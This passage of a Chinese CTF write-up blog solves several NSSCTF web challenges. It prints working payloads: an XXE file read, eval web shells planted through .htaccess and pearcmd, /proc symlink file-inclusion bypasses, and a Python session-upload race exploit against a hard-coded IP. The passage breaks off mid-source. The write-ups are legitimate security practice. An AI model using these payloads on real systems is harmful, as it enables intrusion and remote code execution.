<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/test":3/i'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你输入的不正确！！！搞什么！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$bbb</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>PHP版本5.6.28，但是底下正则把成员个数限死了不能修改</p>
<p>不过有<code>$this-&gt;b=$this-&gt;c;</code>，可以进行引用绕过，把a和b变成用同一个内存变量，所以给b赋值相当于给a赋值</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('ls /');"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$v</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$v</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h1><blockquote>
<p>xxe</p>
</blockquote>
<p>进入题目，是一个登录框，随便输个账号密码进去试试</p>
<p>返回报错</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231025102329807.png" alt="image-20231025102329807"></p>
<p>是xml格式传输数据的，猜测在<code>&lt;username&gt;</code>处存在xxe注入</p>
<p>在&#x2F;doLogin.php路由进行post传参</p>
<p>没做过滤，直接读flag就行</p>
<p>payload：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
  &lt;!ENTITY xxe SYSTEM "file:///flag">
  </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-Ez-upload"><a href="#SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="[SWPUCTF 2022 新生赛]Ez_upload"></a>[SWPUCTF 2022 新生赛]Ez_upload</h1><blockquote>
<p>.htaccess文件上传</p>
</blockquote>
<p>抓包改php后缀传马，返回<code>后缀名不能有ph！</code></p>
<p>正常上传，发现要把Content-Type改为image&#x2F;jpeg，png不行</p>
<p>测试一下几种后缀绕过的方法发现没用，考虑传.htaccess文件绕过</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;
Sethandler application&#x2F;x-httpd-php
&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后上传图片马，测了半天发现文件内容好像过滤了php标签和一部分短标签</p>
<p>那就用script短标签绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token operator">></span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上传成功</p>
<p>直接命令执行即可</p>
<p>flag在phpinfo</p>
<hr>
<h1 id="NSSRound-8-Basic-MyPage"><a href="#NSSRound-8-Basic-MyPage" class="headerlink" title="[NSSRound#8 Basic]MyPage"></a>[NSSRound#8 Basic]MyPage</h1><blockquote>
<p>文件包含&#x2F;proc or pearcmd or session</p>
</blockquote>
<p>进入题目，很明显能发现路由<code>/index.php?file=</code>存在任意文件包含</p>
<p>尝试php伪协议读取和写入一句话木马，失败，猜测是用了<code>require_once()</code>不能重复包含文件</p>
<p>这里有三种解决办法：</p>
<h2 id="方法1：伪协议配合多级符号链接"><a href="#方法1：伪协议配合多级符号链接" class="headerlink" title="方法1：伪协议配合多级符号链接"></a>方法1：伪协议配合多级符号链接</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
<p>这里需要用cwd读当前目录来读取文件源码，因为&#x2F;var&#x2F;www&#x2F;html被过滤了：</p>
<p>注：在POST处理数据的时候，某些WAF只处理8k的数据，后面的选择放过，这时候就可以用大量脏数据绕过，但GET型使用大量脏数据则会返回<code>414 (Request-URI Too Long)</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>base64解码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location:/index.php?file='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">include_once</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了不少协议，还用了<code>include_once</code></p>
<p>尝试直接读flag成功</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="方法2：pearcmd"><a href="#方法2：pearcmd" class="headerlink" title="方法2：pearcmd"></a>方法2：pearcmd</h2><p>由于这题本质上就是个文件包含，虽然不知道php的配置register_argc_argv是否开启，但是php版本为PHP&#x2F;7.2.34，pecl&#x2F;pear是默认安装的，所以可以尝试用pearcmd来做</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>+/tmp/test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>写入成功，注：用burpsuite发送这段payload，不然<code>&lt;</code>和<code>&gt;</code>会被提前编码掉</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231025114543062.png" alt="image-20231025114543062"></p>
<p>直接包含访问&#x2F;tmp&#x2F;test.php，命令执行</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231025114616733.png" alt="image-20231025114616733"></p>
<hr>
<h2 id="方法3：session-upload-progress与Session文件包含"><a href="#方法3：session-upload-progress与Session文件包含" class="headerlink" title="方法3：session.upload_progress与Session文件包含"></a>方法3：session.upload_progress与Session文件包含</h2><p>在上面那个方法读取phpinfo时，我们可以发现<code>session.upload_progress.enable </code>这个选项是On</p>
<p>也就是说可以进行session文件包含，上传含有所需内容的session文件，然后利用条件竞争的方法利用该session文件</p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> wait
 
target <span class="token operator">=</span> <span class="token string">'http://43.142.108.3:28104/'</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">'helloworld'</span>

<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    files <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'load.png'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">40960</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">rf'''&lt;?php file_put_contents('/tmp/success', '&lt;?=phpinfo()?>'); echo('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'); ?>'''</span></span><span class="token punctuation">&#125;</span> 
    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            target<span class="token punctuation">,</span>
            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
            files<span class="token operator">=</span>files<span class="token punctuation">,</span>
            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> flag<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
 
<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span> 
        <span class="token keyword">if</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
            e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>upload<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>write<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    wait<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后访问&#x2F;tmp&#x2F;success即可</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231025115309146.png" alt="image-20231025115309146"></p>
<hr>
<h1 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a>[SWPUCTF 2021 新生赛]babyunser</h1><blockquote>
<p>phar反序列化文件上传</p>
</blockquote>
<p>进入题目，给了我们两个按钮，分别是上传文件和查看文件</p>
<p>先去查看文件，读取一下几个页面的源码</p>
<p>index.php</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>aa的文件管理器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>aa的文件管理器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>read.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>查看文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>upload.php</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;
&lt;title&gt;aa的文件上传器&lt;&#x2F;title&gt;
&lt;body&gt;
    &lt;form action&#x3D;&quot;&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot;&gt;
        &lt;p&gt;请选择要上传的文件：&lt;p&gt;
            &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;
            &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&#x2F;&gt;
    &lt;&#x2F;form&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php
    if(isset($_POST[&#39;submit&#39;]))&#123;
        $upload_path&#x3D;&quot;upload&#x2F;&quot;.md5(time()).&quot;.txt&quot;;
        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        if (move_uploaded_file($temp_file, $upload_path)) &#123;
            echo &quot;文件路径：&quot;.$upload_path;
        &#125; else &#123;
            $msg &#x3D; &#39;上传失败&#39;;
        &#125;
    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这里会对上传的文件后面加上txt后缀，直接传马是不能解析的</p>
<p>read.php</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;
    &lt;title&gt;aa的文件查看器&lt;&#x2F;title&gt;
    &lt;style&gt;
        .search_form&#123;
            width:602px;
            height:42px;
        &#125;

        &#x2F;*左边输入框设置样式*&#x2F;
        .input_text&#123;
            width:400px;
            height: 40px;
            border:1px solid green;
            &#x2F;*清除掉默认的padding*&#x2F;
            padding:0px;
            &#x2F;*提示字首行缩进*&#x2F;
            text-indent: 10px;

            &#x2F;*去掉蓝色高亮框*&#x2F;
            outline: none;

            &#x2F;*用浮动解决内联元素错位及小间距的问题*&#x2F;
            float:left;
        &#125;

        .input_sub&#123;
            width:100px;
            height: 42px;
            background: green;
            text-align:center;
            &#x2F;*去掉submit按钮默认边框*&#x2F;
            border:0px;
            &#x2F;*改成右浮动也是可以的*&#x2F;
            float:left;
            color:white;&#x2F;*搜索的字体颜色为白色*&#x2F;
            cursor:pointer;&#x2F;*鼠标变为小手*&#x2F;
        &#125;

        .file_content&#123;
            width:500px;
            height: 242px;
        &#125;
    &lt;&#x2F;style&gt;
&lt;&#x2F;head&gt;
&lt;?php
include(&#39;class.php&#39;);
$a&#x3D;new aa();
?&gt;
&lt;body&gt;
&lt;h1&gt;aa的文件查看器&lt;&#x2F;h1&gt;
&lt;form class&#x3D;&quot;search_form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;
    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;input_text&quot; placeholder&#x3D;&quot;请输入搜索内容&quot; name&#x3D;&quot;file&quot;&gt;
    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;查看&quot; class&#x3D;&quot;input_sub&quot;&gt;
&lt;&#x2F;form&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
&lt;?php
error_reporting(0);
$filename&#x3D;$_POST[&#39;file&#39;];
if(!isset($filename))&#123;
    die();
&#125;
$file&#x3D;new zz($filename);
$contents&#x3D;$file-&gt;getFile();
?&gt;
&lt;br&gt;
&lt;textarea class&#x3D;&quot;file_content&quot; type&#x3D;&quot;text&quot; value&#x3D;&lt;?php echo &quot;&lt;br&gt;&quot;.$contents;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现这里读取文件是new了一个aa类，获取文件是new了一个zz类，同时发现里面include了一个class.php</p>
<p>再读取class.php看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">aa</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ff</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token string double-quoted-string">"\&lt;?php @eval(\$_POST[1]);?>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">zz</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'surprise'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\/|php:|data|zip|\.\.\//i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不合理'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

